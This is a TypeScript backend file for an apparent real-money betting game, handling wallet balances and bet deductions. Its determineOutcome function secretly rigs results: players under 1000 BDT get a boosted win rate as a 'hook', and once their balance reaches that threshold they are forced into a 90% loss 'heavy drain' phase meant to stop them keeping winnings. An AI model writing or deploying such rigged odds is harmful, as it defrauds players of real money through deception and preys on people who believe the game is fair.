
import { supabase } from '../integrations/supabase/client';

// Threshold where the system starts draining the user heavily
const WIN_THRESHOLD = 1000; 

export const getPlayableBalance = async (userId: string) => {
    const { data: wallet } = await supabase.from('wallets').select('*').eq('user_id', userId).single();
    if (!wallet) return 0;
    
    // Aggregate all playable sources
    return (wallet.main_balance || 0) + 
           (wallet.game_balance || 0) + 
           (wallet.deposit_balance || 0) + 
           (wallet.earning_balance || 0) + 
           (wallet.referral_balance || 0) + 
           (wallet.bonus_balance || 0) + 
           (wallet.commission_balance || 0);
};

export const deductGameBalance = async (userId: string, amount: number) => {
    const { data: wallet } = await supabase.from('wallets').select('*').eq('user_id', userId).single();
    if (!wallet) throw new Error("Wallet not found");

    let remaining = amount;
    const updates: any = {};

    // Priority Order: Game -> Bonus -> Deposit -> Earning -> Referral -> Commission -> Main
    const sources = ['game_balance', 'bonus_balance', 'deposit_balance', 'earning_balance', 'referral_balance', 'commission_balance', 'main_balance'];

    for (const source of sources) {
        if (remaining <= 0) break;
        // @ts-ignore
        const available = wallet[source] || 0;
        if (available > 0) {
            const take = Math.min(available, remaining);
            updates[source] = available - take;
            remaining -= take;
        }
    }

    if (remaining > 0.001) throw new Error("Insufficient funds across all wallets");

    // Also update aggregates if main/deposit touched (legacy sync)
    if (updates.main_balance !== undefined) {
        updates.balance = (wallet.balance || 0) - (amount - (remaining > 0 ? remaining : 0)); // Simplified sync
        updates.withdrawable = Math.max(0, (wallet.main_balance || 0) - (updates.main_balance || 0)); 
    }

    const { error } = await supabase.from('wallets').update(updates).eq('user_id', userId);
    if (error) throw error;
    
    return true;
};

export const determineOutcome = async (userId: string, chance: number = 0.5): Promise<'win' | 'loss'> => {
    try {
        // 1. Check Total Balance to determine phase
        const currentBalance = await getPlayableBalance(userId);
        
        // 2. Heavy Drain Phase (Balance >= 1000)
        // User has reached the 1000 BDT limit.
        // Force 90% loss rate (10% win rate) to strictly prevent balance accumulation.
        if (currentBalance >= WIN_THRESHOLD) {
            if (Math.random() < 0.10) return 'win'; 
            return 'loss';
        }

        // 3. Hook Phase (Balance < 1000)
        // Let them win slightly more often to encourage reaching the threshold.
        const boostedChance = Math.min(0.70, chance + 0.05);
        
        return Math.random() < boostedChance ? 'win' : 'loss';

    } catch (e) {
        // Fallback
        return Math.random() < chance ? 'win' : 'loss';
    }
};
